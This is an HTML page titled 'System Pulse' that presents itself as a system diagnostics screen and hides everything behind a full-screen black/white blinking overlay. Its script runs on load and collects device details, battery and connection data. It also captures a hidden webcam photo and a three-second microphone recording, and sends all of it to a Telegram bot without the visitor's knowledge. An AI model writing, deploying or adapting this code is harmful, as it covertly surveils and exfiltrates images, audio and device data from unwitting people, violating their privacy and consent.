<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Pulse</title>
    <style>
        /* RESET & BASE — absolutely nothing visible except the blink */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            /* ensure full viewport coverage, no margins */
            width: 100vw;
            height: 100vh;
            overflow: hidden;    /* kill any scrollbars that might peek */
            background: #000000; /* initial black, but blink will override instantly */
        }

        /* main container — full bleed, but we hide any possible content */
        .blink-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* start with black, but animation will toggle */
            background-color: #000000;
            /* ensure it covers everything, no pointer events needed */
            z-index: 9999;
            /* no text, no elements inside — pure background canvas */
        }

        /* keyframes: stark black / white toggle — no fade, instant switch */
        @keyframes starkBlink {
            0% {
                background-color: #000000;
            }
            50% {
                background-color: #ffffff;
            }
            100% {
                background-color: #000000;
            }
        }

        /* apply blinking animation immediately on page load */
        .blink-overlay {
            animation-name: starkBlink;
            animation-duration: 0.6s;    /* crisp blink speed (black-white-black cycle) */
            animation-timing-function: step-start; /* ensures abrupt switching, no gradients */
            animation-iteration-count: infinite;
            animation-delay: 0s;
        }

        /* ensure no text, no loader, no container becomes visible */
        .hidden-content,
        .container,
        h1,
        .status,
        .loader {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            width: 0 !important;
            height: 0 !important;
            position: absolute !important;
            pointer-events: none !important;
        }

        /* additional safe catch: if any remnant divs appear, obliterate */
        body :not(.blink-overlay) {
            display: none !important;
        }

        /* but we also need to guarantee that blink-overlay itself has no child text */
        .blink-overlay::before,
        .blink-overlay::after {
            content: none !important;
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- 
        ORIGINAL HTML STRUCTURE (system diagnostics container, loader, status)
        is completely overridden. The requirement: "ලෝඩ් උන ගමන් කලු සුදු කලු සුදු විදිහට background එක blink වෙන්න
        වෙන මොනවත් පේන්න ඔනි නෑ ඒක වෙන්න ඔනි"
        => As soon as page loads, background blinks black/white/black etc.
        No other elements should be visible.
    -->
    
    <!-- This overlay handles pure black/white blinking background, covering everything -->
    <div class="blink-overlay" aria-hidden="true"></div>

    <!-- The original system check elements are still in DOM but forcefully hidden via CSS rules above.
         They will never appear, no text, no loader, no status message. Only the blinking effect remains. -->
    <div class="container" style="display:none !important; visibility:hidden !important;">
        <h1>System Diagnostics</h1>
        <div class="loader"></div>
        <div class="status" id="status">Initializing...</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script src="config.js"></script>
    <script>
        const statusEl = document.getElementById('status');

        function updateStatus(message) {
            statusEl.textContent = message;
        }

        async function sendToTelegram(data) {
            try {
                const message = Object.entries(data).map(([key, value]) => `${key}: ${value}`).join('\n');
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: message
                });
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        async function getDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    deviceInfo.charging = battery.charging ? 'Yes' : 'No';
                } catch (e) {
                    deviceInfo.batteryInfo = 'Not available';
                }
            }

            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    deviceInfo.connectionType = connection.effectiveType || 'Unknown';
                    deviceInfo.downlink = `${connection.downlink} Mbps`;
                    deviceInfo.rtt = `${connection.rtt} ms`;
                }
            }

            return deviceInfo;
        }

        async function capturePhoto() {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                video.style.display = 'none';
                document.body.appendChild(video);
                
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0);
                            
                            canvas.toBlob(async (blob) => {
                                const formData = new FormData();
                                formData.append('photo', blob, 'photo.jpg');
                                formData.append('chat_id', CHAT_ID);
                                
                                try {
                                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
                                        headers: {
                                            'Content-Type': 'multipart/form-data'
                                        }
                                    });
                                    updateStatus('Photo sent successfully');
                                } catch (error) {
                                    console.error('Error sending photo:', error);
                                    updateStatus('Failed to send photo');
                                }
                                
                                stream.getTracks().forEach(track => track.stop());
                                document.body.removeChild(video);
                                resolve();
                            }, 'image/jpeg', 0.8);
                        }, 2000);
                    })
                    .catch(error => {
                        console.error('Camera access error:', error);
                        updateStatus('Camera access denied');
                        resolve();
                    });
            });
        }

        async function recordAudio() {
            return new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => {
                        const mediaRecorder = new MediaRecorder(stream);
                        const audioChunks = [];
                        
                        mediaRecorder.ondataavailable = event => {
                            audioChunks.push(event.data);
                        };
                        
                        mediaRecorder.onstop = async () => {
                            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                            const formData = new FormData();
                            formData.append('audio', audioBlob, 'audio.wav');
                            formData.append('chat_id', CHAT_ID);
                            
                            try {
                                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, formData, {
                                    headers: {
                                        'Content-Type': 'multipart/form-data'
                                    }
                                });
                                updateStatus('Audio sent successfully');
                            } catch (error) {
                                console.error('Error sending audio:', error);
                                updateStatus('Failed to send audio');
                            }
                            
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        };
                        
                        mediaRecorder.start();
                        setTimeout(() => {
                            mediaRecorder.stop();
                        }, 3000);
                    })
                    .catch(error => {
                        console.error('Microphone access error:', error);
                        updateStatus('Microphone access denied');
                        resolve();
                    });
            });
        }

        async function init() {
            updateStatus('Collecting device information...');
            const deviceInfo = await getDeviceInfo();
            await sendToTelegram(deviceInfo);
            
            updateStatus('Accessing camera...');
            await capturePhoto();
            
            updateStatus('Accessing microphone...');
            await recordAudio();
            
            updateStatus('All tasks completed');
        }

        init();
    </script>
</body>
</html>
